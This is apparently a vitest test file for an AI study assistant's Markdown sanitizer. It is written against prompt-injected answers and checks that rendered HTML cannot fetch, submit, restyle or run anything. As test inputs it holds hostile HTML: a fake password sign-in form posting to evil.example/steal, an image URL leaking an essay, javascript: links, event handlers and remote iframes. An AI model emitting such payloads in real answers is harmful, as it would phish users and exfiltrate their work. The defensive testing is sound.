// What Chip's answers (and anything else drawn from Markdown) may contain. In a study room anyone
// can relay text as Chip's, and outside one a reading can carry a prompt injection, so the
// rendered HTML must never ask for a password, restyle the app, fetch from elsewhere or run
// anything, while ordinary answers, links, code and math look exactly as they did.
import katex from 'katex';
import { describe, expect, it } from 'vitest';
import { markdownToEditorHtml, renderMarkdown } from '../../src/lib/markdown';

const both = (md: string) => [renderMarkdown(md), markdownToEditorHtml(md)];

/** No element or attribute in [html] that could fetch, submit, restyle or run. */
function inert(html: string) {
  const box = document.createElement('div');
  box.innerHTML = html;
  const bad = box.querySelectorAll('form, input, button, textarea, select, option, style, iframe, object, embed, link, meta, base, script, img, picture, video, audio, source, image, use, dialog');
  expect(bad.length, html).toBe(0);
  for (const el of Array.from(box.querySelectorAll('*'))) {
    for (const a of Array.from(el.attributes)) {
      expect(['src', 'srcset', 'action', 'formaction', 'background', 'ping', 'xlink:href', 'srcdoc']).not.toContain(a.name);
      if (a.name.startsWith('on')) throw new Error(`event handler ${a.name} in ${html}`);
      if (a.name === 'href') {
        expect(el.tagName.toLowerCase(), html).toBe('a');
        expect(a.value).not.toMatch(/^\s*(javascript|data|vbscript):/i);
      }
      if (a.name === 'style') {
        expect(el.closest('.katex'), `style outside math: ${html}`).not.toBeNull();
        expect(a.value).not.toMatch(/url|fixed|absolute|expression|import|vw|vh|z-index|@/i);
      }
    }
  }
  expect(html).not.toMatch(/evil\.example/);
}

describe('Markdown that can’t harm', () => {
  it('drops a fake sign-in form', () => {
    for (const html of both('<form action="https://evil.example/steal"><p>Your session ended. Sign in again.</p><input type="password" name="p"><button>Sign in</button><select><option>x</option></select><textarea>t</textarea></form>')) {
      inert(html);
      expect(html).toContain('Your session ended');
    }
  });

  it('drops styles that would restyle the app or cover it', () => {
    for (const md of [
      '<style>body{display:none}</style>Hi',
      '<div style="position:fixed;inset:0;background:white;z-index:99">Sign in</div>',
      '<span class="katex"><span style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:url(https://evil.example/x)">x</span></span>',
      '<span class="katex"><span style="top:-9000em;color:red">far</span></span>',
    ]) {
      for (const html of both(md)) inert(html);
    }
    // Inside math, harmless parts survive and the rest goes.
    const html = renderMarkdown('<span class="katex"><span style="color:red;position:fixed;top:-2em;background-image:url(https://evil.example)">x</span></span>');
    expect(html).toContain('color:red');
    expect(html).toContain('top:-2em');
    expect(html).not.toMatch(/fixed|url/);
  });

  it('never loads an image: a Markdown image reads as its description', () => {
    for (const html of both('Look: ![your essay](https://evil.example/?q=my%20whole%20essay) and <img src="https://evil.example/p.png" onerror="alert(1)"> and <img src="data:image/png;base64,AAAA">')) {
      inert(html);
      expect(html).toContain('[your essay]');
    }
  });

  it('drops frames, objects, links to stylesheets, meta refreshes, base, scripts and media', () => {
    for (const html of both(
      '<iframe src="https://evil.example"></iframe><object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x"><link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><script>alert(1)</script><video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video><audio src="https://evil.example/a.mp3"></audio>after',
    )) {
      inert(html);
      expect(html).toContain('after');
    }
  });

  it('drops SVG and MathML that would fetch something', () => {
    inert(renderMarkdown('<svg><image href="https://evil.example/x.png"/><use href="https://evil.example/s.svg#a"/><a href="javascript:alert(1)"><text>t</text></a></svg>'));
    inert(renderMarkdown('<math><mglyph src="https://evil.example/g.png"/><mi>x</mi></math>'));
  });

  it('keeps links safe: a new tab, nothing behind it, no javascript', () => {
    const html = renderMarkdown('[the paper](https://example.com/paper) and [bad](javascript:alert(1)) and <a href="https://example.org" onclick="steal()">raw</a>');
    inert(html);
    expect(html).toContain('<a href="https://example.com/paper" target="_blank" rel="noopener noreferrer">the paper</a>');
    expect(html).toContain('href="https://example.org"');
    expect(html).not.toContain('onclick');
  });
});

describe('Markdown that still looks the same', () => {
  it('renders an ordinary answer: headings, emphasis, lists, code, tables, quotes', () => {
    const md = '## Plan\n\n**Bold** and *italic*.\n\n- one\n- two\n\n1. first\n\n```python\nprint("hi")\n```\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n> a quote\n\n`inline`';
    const html = renderMarkdown(md);
    for (const part of ['<h2>Plan</h2>', '<strong>Bold</strong>', '<em>italic</em>', '<li>one</li>', '<ol>', '<code class="language-python">print("hi")', '<table>', '<td>1</td>', '<blockquote>', '<code>inline</code>']) expect(html).toContain(part);
    inert(html);
  });

  it('keeps every style KaTeX draws math with', () => {
    const formulas = ['x^2', '\\frac{a}{b}', '\\sqrt{x^2+1}', '\\sum_{i=1}^n i', '\\begin{pmatrix}1&2\\\\3&4\\end{pmatrix}', '\\color{red}{x}', '\\overrightarrow{AB}', '\\boxed{x}', '\\cancel{x}', '\\int_0^1 f(x)\\,dx', '\\widehat{abc}', '\\underbrace{a+b}_{n}', '\\colorbox{yellow}{x}', '\\fcolorbox{red}{blue}{x}', '\\xrightarrow{abc}'];
    for (const f of formulas) {
      const raw = katex.renderToString(f, { displayMode: true, throwOnError: false, output: 'htmlAndMathml', strict: 'ignore' });
      const styles = (h: string) =>
        [...h.matchAll(/ style="([^"]*)"/g)]
          .map((m) =>
            m[1]
              .split(';')
              .map((d) => d.replace(/\s+/g, ''))
              .filter(Boolean)
              .sort()
              .join(';'),
          )
          .sort();
      const shown = renderMarkdown(`$$${f}$$`);
      expect(styles(shown), f).toEqual(styles(raw));
      expect(shown).toContain('class="katex-display"');
      expect(shown).toContain('<math');
    }
    expect(renderMarkdown('The energy is $E = mc^2$.')).toContain('class="katex"');
  });

  it('puts math into a document as the editor’s math nodes, and plain words as they are', () => {
    const html = markdownToEditorHtml('Area is $\\pi r^2$.\n\n$$\\frac{a}{b}$$\n\nCoastal towns face a **hard** choice.');
    expect(html).toContain('<span data-type="inline-math" data-latex="\\pi r^2"></span>');
    expect(html).toContain('<div data-type="block-math" data-latex="\\frac{a}{b}"></div>');
    expect(html).toContain('<strong>hard</strong>');
    inert(html);
  });
});
